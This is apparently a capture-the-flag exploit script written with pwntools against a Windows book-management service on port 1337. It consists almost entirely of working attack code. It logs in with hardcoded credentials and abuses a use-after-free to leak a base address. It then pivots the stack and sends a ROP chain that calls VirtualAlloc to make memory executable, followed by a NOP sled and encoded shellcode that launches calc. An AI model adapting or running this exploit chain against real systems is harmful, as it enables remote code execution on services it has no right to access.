from pwn import *
import time

# shellcode - window/exec calc
buf = ""
buf += "\xbf\xf7\xc1\x50\xae\xda\xd0\xd9\x74\x24\xf4\x5d\x29\xc9"
buf += "\xb1\x30\x31\x7d\x13\x83\xc5\x04\x03\x7d\xf8\x23\xa5\x52"
buf += "\xee\x26\x46\xab\xee\x46\xce\x4e\xdf\x46\xb4\x1b\x4f\x77"
buf += "\xbe\x4e\x63\xfc\x92\x7a\xf0\x70\x3b\x8c\xb1\x3f\x1d\xa3"
buf += "\x42\x13\x5d\xa2\xc0\x6e\xb2\x04\xf9\xa0\xc7\x45\x3e\xdc"
buf += "\x2a\x17\x97\xaa\x99\x88\x9c\xe7\x21\x22\xee\xe6\x21\xd7"
buf += "\xa6\x09\x03\x46\xbd\x53\x83\x68\x12\xe8\x8a\x72\x77\xd5"
buf += "\x45\x08\x43\xa1\x57\xd8\x9a\x4a\xfb\x25\x13\xb9\x05\x61"
buf += "\x93\x22\x70\x9b\xe0\xdf\x83\x58\x9b\x3b\x01\x7b\x3b\xcf"
buf += "\xb1\xa7\xba\x1c\x27\x23\xb0\xe9\x23\x6b\xd4\xec\xe0\x07"
buf += "\xe0\x65\x07\xc8\x61\x3d\x2c\xcc\x2a\xe5\x4d\x55\x96\x48"
buf += "\x71\x85\x79\x34\xd7\xcd\x97\x21\x6a\x8c\xfd\xb4\xf8\xaa"
buf += "\xb3\xb7\x02\xb5\xe3\xdf\x33\x3e\x6c\xa7\xcb\x95\xc9\x57"
buf += "\x86\xb4\x7b\xf0\x4f\x2d\x3e\x9d\x6f\x9b\x7c\x98\xf3\x2e"
buf += "\xfc\x5f\xeb\x5a\xf9\x24\xab\xb7\x73\x34\x5e\xb8\x20\x35"
buf += "\x4b\xdb\xa7\xa5\x17\x1c"


#r = remote("192.168.35.120",1337)
r = remote("172.30.1.38", 1337)

def login():
	r.recv()
	r.sendline("helloadmin")
	time.sleep(0.1)
	r.recv()
	r.sendline("Iulover!@#")
	time.sleep(0.1)
	print "LOGIN"

def Add_book():
	r.recv()
	r.sendline("1")
	time.sleep(0.1)
	r.recv()
	r.sendline("1")		#book
	time.sleep(0.1)
	r.recv()
	r.sendline("aaaa")	#bookname
	time.sleep(0.1)
	r.recv()
	r.sendline("bbbb")	#description
	time.sleep(0.1)
	r.recv()
	r.sendline("1")		#stoke
	time.sleep(0.1)
	r.recv()
	r.sendline("1")		#price
	time.sleep(0.1)
	r.recv()
	r.sendline("1")		#free shipping
	time.sleep(0.1)
	print "Make Book"

def Add_ebook():
	r.recv()
        r.sendline("1")
        time.sleep(0.1)
        r.recv()
        r.sendline("2")         #ebook
        time.sleep(0.1)
        r.recv()
        r.sendline("aaaa")      #bookname
        time.sleep(0.1)
        r.recv()
        r.sendline("bbbb")      #description
        time.sleep(0.1)
        r.recv()
        r.sendline("1")         #stoke
        time.sleep(0.1)
        r.recv()
        r.sendline("1")         #price
        time.sleep(0.1)
        r.recv()
        r.sendline("1")         #max download
        time.sleep(0.1)
	print "Make EBook"

def Modify(index):
	r.recv()
	time.sleep(0.1)
	r.sendline("2")		#index
	time.sleep(0.1)
	r.recv()
	r.sendline(str(index))
	time.sleep(0.1)
	r.recv()
	r.sendline("4")		#modify available
	time.sleep(0.1)
	r.recv()
	r.sendline("0")		#available = 0
	time.sleep(0.1)
	r.recv()
	r.sendline("0")		# back
	time.sleep(0.1)
	print "Modify"

def Free(index):
	r.recv()
	r.sendline("3")
	time.sleep(0.1)
	r.recv()
	r.sendline(str(index))	#index
	time.sleep(0.1)
	print "Free"

def leak(index):
	r.recv()
	r.sendline("4")
	time.sleep(0.1)
	r.recv()
	r.sendline(str(index))	#index
	time.sleep(0.1)
	r.recvuntil("Price : ")


def Modify_eip(eip, buf):
	r.recv()
        time.sleep(0.1)
        r.sendline("2") 
        time.sleep(0.1)
        r.recv()
        r.sendline("10")	#index
	time.sleep(0.1)
        r.recv()
        r.sendline("3")         #modify property
        time.sleep(0.1)
        r.recv()
        r.sendline(str(buf))    #stoke = mem
        time.sleep(0.1)
        r.recv()
	r.sendline(str(eip))	#price = gadget
	time.sleep(0.1)
	r.recv()
	r.sendline(str(eip))	#max = gadget
	time.sleep(0.1)
	r.recv()
        r.sendline("0")         # back
        time.sleep(0.1)
	print "Modify eip"

def payload(base, mem):
	virtual = base + 0x2070	#lpAddress #size #0x40
	lpAdd = 0x30000
	getIn = base + 0x1460	#to #size	=> copy from stdin to arg1
	pppr  = base + 0x70CF	
	ppr   = base + 0x70D0

	pay = ""
	pay += "AAAA"
	pay += "AAAA"
	pay += p32(virtual)	#virtualalloc
	pay += p32(pppr)	#ret
	pay += p32(lpAdd)	#lpAddress 
	pay += p32(0x3000)	#size
	pay += p32(0x40)	#flProtect -> PAGE_EXCUTE_READWRITE

	pay += p32(getIn)	#get data from stdin
	pay += p32(ppr)		#ret
	pay += p32(lpAdd)	#copy to
	pay += p32(0x1000)	#size

	pay += p32(lpAdd)

	r.recv()
        time.sleep(0.1)
        r.sendline("2")
        time.sleep(0.1)
        r.recv()
        r.sendline("10")                #index
        time.sleep(0.1)
        r.recv()
        r.sendline("2")         #modify description
	time.sleep(0.1)
	r.recv()
	r.sendline(pay)
	print "Modify description"
        time.sleep(0.1)
	r.recv()
        r.sendline("0")         # back
        time.sleep(0.1)
	
def exploit(index):
	r.recv()
        r.sendline("4")
        time.sleep(0.1)
        r.recv()
        r.sendline(str(index))  #index
	print "send exploit index"
        time.sleep(0.1)
        r.recv()
	

login()

for i in range(0,4):
	Add_ebook()

for i in range(0,4):
	Modify(i)

for i in range(0,4):
	Free(i)

for i in range(0,4):
	Add_book()

leak(2)
get = r.recvuntil(" : ")
func =  int(get.split("\x0a")[0])
base = func - 0x1BB0
print "base addr : " + hex(base)

pivot = base + 0x1E97
mem   = base + 0x171C0


for i in range(4,8):
	Modify(i)

for i in range(4,8):
	Free(i)

for i in range(0,4):
	Add_ebook()


Modify_eip(pivot,mem)	#pivot #mem
payload(base, mem)

exploit(7)

pay2 = ""
pay2 += "\x90"*0x100
pay2 += "\xbc\x00\x00\x03\x00"	# mov esp,0x3000
pay2 += "\x90"*0x100
pay2 += buf
pay2 += "\x90"*0x100
pay2 += "\xcc"


r.sendline(pay2)


